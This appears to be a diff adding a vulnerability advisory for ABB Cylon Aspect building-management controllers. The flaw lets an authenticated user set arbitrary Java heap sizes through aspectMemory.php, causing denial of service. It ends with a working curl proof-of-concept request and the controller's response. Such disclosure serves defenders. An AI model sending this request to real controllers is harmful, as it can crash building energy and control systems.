@@ -1,0 +1,88 @@
+
+ABB Cylon Aspect 3.08.02 (aspectMemory.php) Arbitrary Heap Memory Configuration
+
+
+Vendor: ABB Ltd.
+Product web page: https://www.global.abb
+Affected version: NEXUS Series, MATRIX-2 Series, ASPECT-Enterprise, ASPECT-Studio
+                  Firmware: <=3.08.02
+
+Summary: ASPECT is an award-winning scalable building energy management
+and control solution designed to allow users seamless access to their
+building data through standard building protocols including smart devices.
+
+Desc: An authenticated access vulnerability in the aspectMemory.php script
+of ABB Cylon Aspect BMS/BAS controllers allows attackers to set arbitrary
+values for Java heap memory parameters (HEAPMIN and HEAPMAX). This configuration
+is written to /usr/local/aam/etc/javamem. The absence of input validation
+can lead to system performance degradation, Denial-of-Service (DoS) conditions,
+and crashes of critical Java applications.
+
+Tested on: GNU/Linux 3.15.10 (armv7l)
+           GNU/Linux 3.10.0 (x86_64)
+           GNU/Linux 2.6.32 (x86_64)
+           Intel(R) Atom(TM) Processor E3930 @ 1.30GHz
+           Intel(R) Xeon(R) Silver 4208 CPU @ 2.10GHz
+           PHP/7.3.11
+           PHP/5.6.30
+           PHP/5.4.16
+           PHP/4.4.8
+           PHP/5.3.3
+           AspectFT Automation Application Server
+           lighttpd/1.4.32
+           lighttpd/1.4.18
+           Apache/2.2.15 (CentOS)
+           OpenJDK Runtime Environment (rhel-2.6.22.1.-x86_64)
+           OpenJDK 64-Bit Server VM (build 24.261-b02, mixed mode)
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2024-5883
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2024-5883.php
+CVE ID: CVE-2024-51544
+        CVE-2024-51550
+CVE URL: https://www.cve.org/CVERecord?id=CVE-2024-51544
+         https://www.cve.org/CVERecord?id=CVE-2024-51550
+
+
+21.04.2024
+
+--
+
+
+$ cat project
+
+                 P   R   O   J   E   C   T
+
+                        .|
+                        | |
+                        |'|            ._____
+                ___    |  |            |.   |' .---"|
+        _    .-'   '-. |  |     .--'|  ||   | _|    |
+     .-'|  _.|  |    ||   '-__  |   |  |    ||      |
+     |' | |.    |    ||       | |   |  |    ||      |
+ ____|  '-'     '    ""       '-'   '-.'    '`      |____
+░▒▓███████▓▒░░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░▒▓███████▓▒░  
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓███████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+         ░▒▓████████▓▒░▒▓██████▓▒░ ░▒▓██████▓▒░ 
+         ░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
+         ░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░░░░░░ 
+         ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒▒▓███▓▒░
+         ░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
+         ░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
+         ░▒▓█▓▒░░░░░░░░▒▓██████▓▒░ ░▒▓██████▓▒░ 
+
+
+$ curl http://192.168.73.31/aspectMemory.php \
+> -H "Cookie: PHPSESSID=xxx"
+> -d "HEAPMIN=32M&HEAPMAX=64M&ACTION=COMMIT"
+
+Heap Sizes Updated - restart Aspect to enable updated sizes
